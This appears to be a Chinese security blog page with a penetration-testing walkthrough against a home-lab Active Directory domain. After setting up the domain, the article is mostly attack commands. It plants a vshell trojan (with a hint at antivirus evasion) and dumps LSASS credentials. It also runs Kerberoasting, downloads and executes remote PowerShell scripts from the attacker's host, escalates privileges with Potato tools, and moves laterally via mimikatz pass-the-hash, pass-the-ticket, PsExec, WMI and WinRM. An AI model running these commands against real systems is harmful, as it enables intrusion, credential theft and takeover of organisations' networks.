@@ -1,0 +1,374 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>域渗透实战笔记 | 拾憶</title><meta name="author" content="杰哥"><meta name="copyright" content="杰哥"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一.域控环境配置域控主机：windows server 192.168.40.138 域成员：windows 10 192.168.40.129  准备域控制器（DC）  在 Windows Server 上安装 AD DS 角色： powershell    # 安装 Active Directory 域服务    Install-WindowsFeature -Name AD-Domain-S">
+<meta property="og:type" content="article">
+<meta property="og:title" content="域渗透实战笔记">
+<meta property="og:url" content="https://jiege56.github.io/2026/07/15/%E5%9F%9F%E6%B8%97%E9%80%8F/index.html">
+<meta property="og:site_name" content="拾憶">
+<meta property="og:description" content="一.域控环境配置域控主机：windows server 192.168.40.138 域成员：windows 10 192.168.40.129  准备域控制器（DC）  在 Windows Server 上安装 AD DS 角色： powershell    # 安装 Active Directory 域服务    Install-WindowsFeature -Name AD-Domain-S">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s.panlai.com/zb_users/upload/2025/03/bizhihui_com_202503251742906624124197.jpg-arthumbs">
+<meta property="article:published_time" content="2026-07-15T04:00:00.000Z">
+<meta property="article:modified_time" content="2026-07-15T04:53:32.872Z">
+<meta property="article:author" content="杰哥">
+<meta property="article:tag" content="Windows安全">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="域渗透">
+<meta property="article:tag" content="安全研究">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="横向移动">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s.panlai.com/zb_users/upload/2025/03/bizhihui_com_202503251742906624124197.jpg-arthumbs"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "域渗透实战笔记",
+  "url": "https://jiege56.github.io/2026/07/15/%E5%9F%9F%E6%B8%97%E9%80%8F/",
+  "image": "https://s.panlai.com/zb_users/upload/2025/03/bizhihui_com_202503251742906624124197.jpg-arthumbs",
+  "datePublished": "2026-07-15T04:00:00.000Z",
+  "dateModified": "2026-07-15T04:53:32.872Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "杰哥",
+      "url": "https://jiege56.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="https://jiege56.github.io/2026/07/15/%E5%9F%9F%E6%B8%97%E9%80%8F/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.5"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.2.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '域渗透实战笔记',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script></head><body><div class="bg-animation" id="web_bg" style="background-image: url(https://s.panlai.com/zb_users/upload/2025/03/bizhihui_com_202503251742906624124197.jpg-arthumbs);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/111.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时光档案</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://s.panlai.com/zb_users/upload/2025/03/bizhihui_com_202503251742906624124197.jpg-arthumbs);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">拾憶</span></a><a class="nav-page-title" href="/"><span class="site-name">域渗透实战笔记</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时光档案</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">域渗透实战笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-07-15T04:00:00.000Z" title="发表于 2026-07-15 12:00:00">2026-07-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-07-15T04:53:32.872Z" title="更新于 2026-07-15 12:53:32">2026-07-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">安全研究</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="一-域控环境配置"><a href="#一-域控环境配置" class="headerlink" title="一.域控环境配置"></a>一.域控环境配置</h1><p>域控主机：windows server 192.168.40.138</p>
+<p>域成员：windows 10 192.168.40.129</p>
+<ol>
+<li><h1 id="准备域控制器（DC）"><a href="#准备域控制器（DC）" class="headerlink" title="准备域控制器（DC）"></a>准备域控制器（DC）</h1></li>
+</ol>
+<p><strong>在 Windows Server 上安装 AD DS 角色：</strong></p>
+<p><strong>powershell</strong><br>    # 安装 Active Directory 域服务<br>    Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools</p>
+<pre><code># 导入模块
+Import-Module ADDSDeployment
+
+# 创建新域（例如 corp.local）
+Install-ADDSForest `
+    -DomainName &quot;corp.local&quot; `
+    -DomainNetbiosName &quot;CORP&quot; `
+    -ForestMode &quot;WinThreshold&quot; `
+    -DomainMode &quot;WinThreshold&quot; `
+    -InstallDns:$true `
+    -CreateDnsDelegation:$false `
+    -DatabasePath &quot;C:\Windows\NTDS&quot; `
+    -LogPath &quot;C:\Windows\NTDS&quot; `
+    -SysvolPath &quot;C:\Windows\SYSVOL&quot; `
+    -NoRebootOnCompletion:$false `
+    -Force:$true
+</code></pre>
+<p>这里设置密码的时候需要设置强密码<br>    $SecurePassword &#x3D; ConvertTo-SecureString “P@ssw0rd!2024#Lab” -AsPlainText -Force</p>
+<h2 id="安装完成后验证"><a href="#安装完成后验证" class="headerlink" title="安装完成后验证"></a>安装完成后验证</h2><p>重启后，在域控上执行：</p>
+<p><strong>powershell</strong><br>    # 确认域控状态<br>    Get-ADDomainController</p>
+<pre><code># 查看域信息
+Get-ADDomain corp.local
+
+# 查看林信息
+Get-ADForest corp.local
+
+# 确认 DNS 服务运行
+Get-Service DNS
+</code></pre>
+<p>这样表示域控制器安装成功了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/62398637/1783923500300-7608b83e-e787-4982-9ae9-0a9192fcbf2c.png"></p>
+<p>各字段含义</p>
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>值</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>DistinguishedName</code></td>
+<td><code>DC=corp,DC=local</code></td>
+<td>域的 LDAP 路径</td>
+</tr>
+<tr>
+<td><code>DNSRoot</code></td>
+<td><code>corp.local</code></td>
+<td>域的 DNS 根域名</td>
+</tr>
+<tr>
+<td><code>NetBIOSName</code></td>
+<td><code>CORP</code></td>
+<td>域的短名称</td>
+</tr>
+<tr>
+<td><code>DomainMode</code></td>
+<td><code>Windows2016Domain</code></td>
+<td>域功能级别</td>
+</tr>
+<tr>
+<td><code>Forest</code></td>
+<td><code>corp.local</code></td>
+<td>所属林</td>
+</tr>
+<tr>
+<td><code>InfrastructureMaster</code></td>
+<td><code>WIN-GPN8ACE1K2F.corp.local</code></td>
+<td>域控主机名</td>
+</tr>
+</tbody></table>
+<h1 id="二-将windows靶机加入域成员"><a href="#二-将windows靶机加入域成员" class="headerlink" title="二.将windows靶机加入域成员"></a>二.将windows靶机加入域成员</h1><h3 id="1-在-Windows-靶机上设置-DNS"><a href="#1-在-Windows-靶机上设置-DNS" class="headerlink" title="1. 在 Windows 靶机上设置 DNS"></a>1. 在 Windows 靶机上设置 DNS</h3><p><strong>关键：Windows 靶机的 DNS 必须指向域控 IP</strong>，否则无法解析域。<br>    # 查看当前网络接口<br>    Get-NetAdapter</p>
+<pre><code># 设置 DNS 为域控 IP（假设域控 IP 是 192.168.1.10，接口名为&quot;以太网&quot;）
+Set-DnsClientServerAddress -InterfaceAlias &quot;以太网&quot; -ServerAddresses &quot;192.168.40.138&quot;
+</code></pre>
+<h3 id="2-测试-DNS-解析"><a href="#2-测试-DNS-解析" class="headerlink" title="2. 测试 DNS 解析"></a>2. 测试 DNS 解析</h3><pre><code># 测试能否解析域控
+nslookup corp.local
+nslookup WIN-GPN8ACE1K2F.corp.local
+
+# 测试域控 SRV 记录
+nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local
+</code></pre>
+<h3 id="3-加入域"><a href="#3-加入域" class="headerlink" title="3. 加入域"></a>3. 加入域</h3><p><strong>powershell</strong><br>    # 加入域（需要域管理员凭据）<br>    Add-Computer -DomainName “corp.local” -Credential “CORP\Administrator” -Restart</p>
+<p>这里输入密码之后会重启，这里输入的密码是你windows server 的登录密码</p>
+<h3 id="4-验证加入成功"><a href="#4-验证加入成功" class="headerlink" title="4. 验证加入成功"></a>4. 验证加入成功</h3><p>重启后在 Windows 靶机上执行：</p>
+<p><strong>powershell</strong><br>    # 确认已在域内<br>    (Get-WmiObject Win32_ComputerSystem).PartOfDomain  # 应返回 True<br>    (Get-WmiObject Win32_ComputerSystem).Domain        # 应返回 corp.local</p>
+<pre><code># 查看当前登录用户信息
+whoami  # 应显示 corp\用户名
+
+# 查看域内其他计算机
+Get-ADComputer -Filter * | Select Name, DNSHostName
+</code></pre>
+<p>这里输入whoami之后</p>
+<ul>
+<li>如果登录的是域账户：<code>corp\用户名</code></li>
+<li>如果还是本地账户：<code>DESKTOP-7IHJB6T\用户名</code></li>
+</ul>
+<h2 id="如果-whoami-显示本地用户"><a href="#如果-whoami-显示本地用户" class="headerlink" title="如果 whoami 显示本地用户"></a>如果 whoami 显示本地用户</h2><p>如果 <code>whoami</code> 显示的是 <code>DESKTOP-7IHJB6T\用户名</code>（本地账户），你可以：</p>
+<ol>
+<li><strong>注销当前用户，用域账户登录</strong></li>
+</ol>
+<ul>
+<li><p>用户名：<code>CORP\Administrator</code></p>
+</li>
+<li><p>密码：域管理员密码</p>
+</li>
+</ul>
+<ol start="2">
+<li><p><strong>或者将当前本地用户添加到域****powershell</strong></p>
+<h1 id="查看当前用户"><a href="#查看当前用户" class="headerlink" title="查看当前用户"></a>查看当前用户</h1><p> whoami</p>
+<h1 id="切换到域账户"><a href="#切换到域账户" class="headerlink" title="切换到域账户"></a>切换到域账户</h1><p> runas &#x2F;user:CORP\Administrator cmd（输入windows的登录密码即可）</p>
+</li>
+</ol>
+<h1 id="三-开始渗透"><a href="#三-开始渗透" class="headerlink" title="三.开始渗透"></a>三.开始渗透</h1><h1 id="一-主机控制（域内）"><a href="#一-主机控制（域内）" class="headerlink" title="一.主机控制（域内）"></a>一.主机控制（域内）</h1><p>1.控制靶机windows，我这里使用vshell去进行上传木马，具体在真实环境中就得通过一些打点或者钓鱼去进行了，在监听管理处进行添加监听</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/62398637/1783925432500-657e05a2-f3e3-4d3e-a813-b5209fa50252.png"></p>
+<p>2.生成木马，在看客户端处生成木马，这里可以选择不同的操作系统及版本</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/62398637/1783925486274-50c9f2f8-e6c0-4608-910d-d701db1a9380.png"></p>
+<p>3.生成之后上传到windows靶机上面，这里火绒是检测不出来的，但是系统的病毒防护可以检测出来这里大家可以尝试去加壳做一些免杀，上传之后点击就会在vshell里面看到被控制主机<img src="https://cdn.nlark.com/yuque/0/2026/png/62398637/1783925657488-d555230a-27d9-44f0-ab17-3185cf291b45.png"></p>
+<p>4.控制之后可以就开始尝试收集信息进行渗透<br>    :: 查看当前域<br>    echo %USERDOMAIN%<br>    whoami</p>
+<pre><code>:: 查看域控信息
+nltest /dsgetdc:corp.local
+
+:: 查看域信任关系
+nltest /domain_trusts
+
+:: 查看当前登录域用户缓存的域信息
+klist
+
+:: 查看 Kerberos 票据
+klist tickets
+
+:: 查看域内用户（如果有权限）
+net user /domain
+
+:: 查看域内组
+net group /domain
+
+:: 查看域管理员组
+net group &quot;Domain Admins&quot; /domain
+
+:: 查看域内计算机
+net view /domain:corp
+
+:: 查看当前域的 SID
+whoami /user
+</code></pre>
+<p>这里可以看到就是管理员权限,这里查看版本信息之后如果是旧版本可以尝试历史漏洞</p>
+<p>根据之前搭建的时候我们就可以知道这样连接<br>    net use \192.168.40.138\c$ &#x2F;user:CORP\Administrator P@ssw0rd!2024#Lab<br>    dir \192.168.40.138\c$</p>
+<h3 id="2-内存凭证（需要提权到-SYSTEM）"><a href="#2-内存凭证（需要提权到-SYSTEM）" class="headerlink" title="2. 内存凭证（需要提权到 SYSTEM）"></a>2. 内存凭证（需要提权到 SYSTEM）</h3><p>如果最终能提权：</p>
+<p><strong>cmd</strong><br>    :: 使用 comsvcs.dll（SYSTEM 权限下）<br>    rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full</p>
+<h3 id="3-Kerberoasting（普通域用户即可）"><a href="#3-Kerberoasting（普通域用户即可）" class="headerlink" title="3. Kerberoasting（普通域用户即可）"></a>3. Kerberoasting（普通域用户即可）</h3><p><strong>powershell</strong><br>    # 请求 SPN 的服务票据（不需要 RSAT，不需要管理员）<br>    Add-Type -AssemblyName System.IdentityModel<br>    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList “MSSQLSvc&#x2F;sql01.corp.local:1433”</p>
+<pre><code># 或者使用 PowerView 的 Invoke-Kerberoast
+IEX (New-Object Net.WebClient).DownloadString(&#39;http://你的IP/PowerView.ps1&#39;)
+Invoke-Kerberoast -OutputFormat hashcat | Select-Object -ExpandProperty hash
+
+# 导出票据到本地破解
+klist export kirbi
+</code></pre>
+<p><strong>Kerberoasting 原理：</strong></p>
+<ul>
+<li>任何域用户都可以请求带有 SPN 的服务票据</li>
+<li>这些票据使用服务账户密码加密</li>
+<li>离线破解可获得服务账户明文密码</li>
+</ul>
+<h2 id="三、权限提升（普通用户-→-管理员-SYSTEM）"><a href="#三、权限提升（普通用户-→-管理员-SYSTEM）" class="headerlink" title="三、权限提升（普通用户 → 管理员&#x2F;SYSTEM）"></a>三、权限提升（普通用户 → 管理员&#x2F;SYSTEM）</h2><h3 id="1-本地提权漏洞"><a href="#1-本地提权漏洞" class="headerlink" title="1. 本地提权漏洞"></a>1. 本地提权漏洞</h3><p><strong>powershell</strong><br>    # 检查系统补丁<br>    systeminfo | findstr KB</p>
+<pre><code># 使用 WinPEAS 自动扫描
+.\winPEASany.exe
+
+# 使用 PowerUp 检查
+IEX (New-Object Net.WebClient).DownloadString(&#39;http://你的IP/PowerUp.ps1&#39;)
+Invoke-AllChecks
+</code></pre>
+<h3 id="2-土豆家族提权（NTLM-Relay）"><a href="#2-土豆家族提权（NTLM-Relay）" class="headerlink" title="2. 土豆家族提权（NTLM Relay）"></a>2. 土豆家族提权（NTLM Relay）</h3><p><strong>cmd</strong><br>    # JuicyPotato（需要 SeImpersonatePrivilege）<br>    .\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}</p>
+<pre><code># RoguePotato（JuicyPotato 的升级版）
+.\RoguePotato.exe -r 你的IP -e &quot;cmd.exe&quot;
+
+# SweetPotato（综合版）
+.\SweetPotato.exe -a t -e cmd.exe
+</code></pre>
+<h3 id="3-PrintSpoofer-GenericPotato"><a href="#3-PrintSpoofer-GenericPotato" class="headerlink" title="3. PrintSpoofer&#x2F;GenericPotato"></a>3. PrintSpoofer&#x2F;GenericPotato</h3><p><strong>cmd</strong><br>    .\PrintSpoofer.exe -c “cmd.exe”</p>
+<h3 id="4-计划任务-服务提权"><a href="#4-计划任务-服务提权" class="headerlink" title="4. 计划任务&#x2F;服务提权"></a>4. 计划任务&#x2F;服务提权</h3><p><strong>cmd</strong><br>    :: 检查可写路径的服务<br>    accesschk.exe -uwcqv “Authenticated Users” *<br>    accesschk.exe -uwcqv “Users” *</p>
+<pre><code>:: 检查 AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</code></pre>
+<h2 id="四、横向移动（获取域凭证后）"><a href="#四、横向移动（获取域凭证后）" class="headerlink" title="四、横向移动（获取域凭证后）"></a>四、横向移动（获取域凭证后）</h2><h3 id="1-Pass-the-Hash"><a href="#1-Pass-the-Hash" class="headerlink" title="1. Pass-the-Hash"></a>1. Pass-the-Hash</h3><p><strong>cmd</strong><br>    :: 使用 mimikatz<br>    mimikatz.exe “sekurlsa::pth &#x2F;user:Administrator &#x2F;domain:corp.local &#x2F;ntlm:哈希值 &#x2F;run:cmd.exe”</p>
+<pre><code>:: 使用 Invoke-WMIExec
+Invoke-WMIExec -Target 192.168.40.138 -Domain corp.local -Username Administrator -Hash 哈希值 -Command &quot;whoami&quot;
+</code></pre>
+<h3 id="2-Pass-the-Ticket"><a href="#2-Pass-the-Ticket" class="headerlink" title="2. Pass-the-Ticket"></a>2. Pass-the-Ticket</h3><p><strong>powershell</strong><br>    # 导入票据<br>    mimikatz.exe “kerberos::ptt 票据文件.kirbi”</p>
+<pre><code># 或者使用 Rubeus
+.\Rubeus.exe ptt /ticket:票据文件.kirbi
+</code></pre>
+<h3 id="3-使用已获取的明文密码"><a href="#3-使用已获取的明文密码" class="headerlink" title="3. 使用已获取的明文密码"></a>3. 使用已获取的明文密码</h3><p><strong>cmd</strong><br>    :: PsExec<br>    .\PsExec.exe \192.168.40.138 -u CORP\Administrator -p 密码 cmd.exe</p>
+<pre><code>:: WMI
+wmic /node:192.168.40.138 /user:CORP\Administrator /password:密码 process call create &quot;cmd.exe&quot;
+
+:: WinRM
+winrs -r:192.168.40.138 -u:CORP\Administrator -p:密码 cmd.exe
+</code></pre>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://jiege56.github.io">杰哥</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://jiege56.github.io/2026/07/15/%E5%9F%9F%E6%B8%97%E9%80%8F/">https://jiege56.github.io/2026/07/15/%E5%9F%9F%E6%B8%97%E9%80%8F/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://jiege56.github.io" target="_blank">拾憶</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">安全研究</a><a class="post-meta__tags" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><a class="post-meta__tags" href="/tags/Windows%E5%AE%89%E5%85%A8/">Windows安全</a><a class="post-meta__tags" href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">横向移动</a><a class="post-meta__tags" href="/tags/%E6%8F%90%E6%9D%83/">提权</a></div><div class="post-share"><div class="social-share" data-image="https://s.panlai.com/zb_users/upload/2025/03/bizhihui_com_202503251742906624124197.jpg-arthumbs" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/06/30/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/" title="Shiro反序列化漏洞详解"><img class="cover" src="https://s.panlai.com/zb_users/upload/2025/03/bizhihui_com_202503251742906624124197.jpg-arthumbs" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Shiro反序列化漏洞详解</div></div><div class="info-2"><div class="info-item-1">序列化1. Shiro框架的基本功能与架构Apache Shiro 是一个强大的 Java 安全框架，它提供了**认证（Authentication）、授权（Authorization）、加密（Cryptography）和会话管理（Session Management）**四大核心功能。Shiro 的目标是简化安全机制的实现，使得开发者可以快速、便捷地为任何规模的应用程序（从最小的移动应用到最大的企业级 Web 应用）添加安全性。 2. 核心模块详解2.1 认证（Authentication） 用户身份识别：通过用户名&#x2F;密码、token、第三方登录等方式验证用户。 Subject API：提供 Subject.login() 方法进行登录操作。 Realm 接口：用于连接外部数据源（如数据库、LDAP）进行身份验证。  2.2 授权（Authorization） 权限控制：基于角色或权限字符串进行访问控制。 支持声明式和编程式权限检查。 示例方法：subject.hasRole(&quot;admin&quot;)、subject.isPermitted(&quot;u...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/06/30/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/" title="Shiro反序列化漏洞详解"><img class="cover" src="https://s.panlai.com/zb_users/upload/2025/03/bizhihui_com_202503251742906624124197.jpg-arthumbs" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-30</div><div class="info-item-2">Shiro反序列化漏洞详解</div></div><div class="info-2"><div class="info-item-1">序列化1. Shiro框架的基本功能与架构Apache Shiro 是一个强大的 Java 安全框架，它提供了**认证（Authentication）、授权（Authorization）、加密（Cryptography）和会话管理（Session Management）**四大核心功能。Shiro 的目标是简化安全机制的实现，使得开发者可以快速、便捷地为任何规模的应用程序（从最小的移动应用到最大的企业级 Web 应用）添加安全性。 2. 核心模块详解2.1 认证（Authentication） 用户身份识别：通过用户名&#x2F;密码、token、第三方登录等方式验证用户。 Subject API：提供 Subject.login() 方法进行登录操作。 Realm 接口：用于连接外部数据源（如数据库、LDAP）进行身份验证。  2.2 授权（Authorization） 权限控制：基于角色或权限字符串进行访问控制。 支持声明式和编程式权限检查。 示例方法：subject.hasRole(&quot;admin&quot;)、subject.isPermitted(&quot;u...</div></div></div></a><a class="pagination-related" href="/2026/06/30/Redis%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%EF%BC%88CVE-2022-0543%EF%BC%89/" title="Redis沙盒逃逸（CVE-2022-0543）"><img class="cover" src="https://s.panlai.com/zb_users/upload/2025/03/bizhihui_com_202503251742906624124197.jpg-arthumbs" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-30</div><div class="info-item-2">Redis沙盒逃逸（CVE-2022-0543）</div></div><div class="info-2"><div 